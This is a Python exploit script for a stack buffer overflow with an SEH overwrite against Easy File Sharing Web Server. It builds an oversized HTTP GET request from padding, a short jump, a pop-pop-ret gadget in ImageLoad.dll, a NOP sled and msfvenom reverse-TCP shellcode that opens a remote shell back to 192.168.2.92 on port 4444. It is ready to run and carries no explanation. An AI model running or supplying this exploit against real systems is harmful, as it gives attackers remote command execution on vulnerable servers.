import os
import struct
import socket

class Exploit:
    HOST = "192.168.2.145"
    PORT = 80
    badchar_file = os.getcwd() + "\\badchar.bin"

    @classmethod
    def generate_badchar(cls):
        badchar_str = b""
        badchar_list = [0x00, 0x0a, 0xd, 0x20, 0x25, 0x2b, 0x2f, 0x5c]

        for i in range(0x00, 0xff + 1):
            if i not in badchar_list:
                badchar_str += struct.pack("B", i)

        with open(cls.badchar_file, "wb+") as bf:
            bf.write(badchar_str)

        return badchar_str

    @classmethod
    def conv_addr(cls, addr):
        return struct.pack("<I", addr)

    @classmethod
    def craft_request(cls):
        # offset to NSEH
        junk = b'A' * 4061
        
        # jmp forward 6 bytes
        NSEH = b'\xeb\x06\x90\x90'

        # 0x10015a88 : pop ebx # pop ecx # ret  |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)  
        SEH = cls.conv_addr(0x10015a88)
        
        NOP = b'\x90' * 160

        # root@kali:/tmp# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.92 LPORT=4444 -f python -b "\x00\x0a\x0d\x20\x25\x2b\x2f\x5c"
        shellcode=  b""
        shellcode+= b"\xd9\xc1\xd9\x74\x24\xf4\x58\xbb\xc3\x61\xa1\xd9\x31"
        shellcode+= b"\xc9\xb1\x52\x83\xc0\x04\x31\x58\x13\x03\x9b\x72\x43"
        shellcode+= b"\x2c\xe7\x9d\x01\xcf\x17\x5e\x66\x59\xf2\x6f\xa6\x3d"
        shellcode+= b"\x77\xdf\x16\x35\xd5\xec\xdd\x1b\xcd\x67\x93\xb3\xe2"
        shellcode+= b"\xc0\x1e\xe2\xcd\xd1\x33\xd6\x4c\x52\x4e\x0b\xae\x6b"
        shellcode+= b"\x81\x5e\xaf\xac\xfc\x93\xfd\x65\x8a\x06\x11\x01\xc6"
        shellcode+= b"\x9a\x9a\x59\xc6\x9a\x7f\x29\xe9\x8b\x2e\x21\xb0\x0b"
        shellcode+= b"\xd1\xe6\xc8\x05\xc9\xeb\xf5\xdc\x62\xdf\x82\xde\xa2"
        shellcode+= b"\x11\x6a\x4c\x8b\x9d\x99\x8c\xcc\x1a\x42\xfb\x24\x59"
        shellcode+= b"\xff\xfc\xf3\x23\xdb\x89\xe7\x84\xa8\x2a\xc3\x35\x7c"
        shellcode+= b"\xac\x80\x3a\xc9\xba\xce\x5e\xcc\x6f\x65\x5a\x45\x8e"
        shellcode+= b"\xa9\xea\x1d\xb5\x6d\xb6\xc6\xd4\x34\x12\xa8\xe9\x26"
        shellcode+= b"\xfd\x15\x4c\x2d\x10\x41\xfd\x6c\x7d\xa6\xcc\x8e\x7d"
        shellcode+= b"\xa0\x47\xfd\x4f\x6f\xfc\x69\xfc\xf8\xda\x6e\x03\xd3"
        shellcode+= b"\x9b\xe0\xfa\xdc\xdb\x29\x39\x88\x8b\x41\xe8\xb1\x47"
        shellcode+= b"\x91\x15\x64\xc7\xc1\xb9\xd7\xa8\xb1\x79\x88\x40\xdb"
        shellcode+= b"\x75\xf7\x71\xe4\x5f\x90\x18\x1f\x08\x5f\x74\x1d\x94"
        shellcode+= b"\x37\x87\x21\x35\x94\x0e\xc7\x5f\x34\x47\x50\xc8\xad"
        shellcode+= b"\xc2\x2a\x69\x31\xd9\x57\xa9\xb9\xee\xa8\x64\x4a\x9a"
        shellcode+= b"\xba\x11\xba\xd1\xe0\xb4\xc5\xcf\x8c\x5b\x57\x94\x4c"
        shellcode+= b"\x15\x44\x03\x1b\x72\xba\x5a\xc9\x6e\xe5\xf4\xef\x72"
        shellcode+= b"\x73\x3e\xab\xa8\x40\xc1\x32\x3c\xfc\xe5\x24\xf8\xfd"
        shellcode+= b"\xa1\x10\x54\xa8\x7f\xce\x12\x02\xce\xb8\xcc\xf9\x98"
        shellcode+= b"\x2c\x88\x31\x1b\x2a\x95\x1f\xed\xd2\x24\xf6\xa8\xed"
        shellcode+= b"\x89\x9e\x3c\x96\xf7\x3e\xc2\x4d\xbc\x4f\x89\xcf\x95"
        shellcode+= b"\xc7\x54\x9a\xa7\x85\x66\x71\xeb\xb3\xe4\x73\x94\x47"
        shellcode+= b"\xf4\xf6\x91\x0c\xb2\xeb\xeb\x1d\x57\x0b\x5f\x1d\x72"

        bof = junk + NSEH + SEH + NOP + shellcode
        return bof

    @classmethod
    def execute(cls):    
        bof = cls.craft_request()
        req =  b"GET " + bof + b" HTTP/1.0\r\n\r\n"

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((cls.HOST, cls.PORT))
            sock.sendall(req)

if __name__ == "__main__":
    Exploit.execute()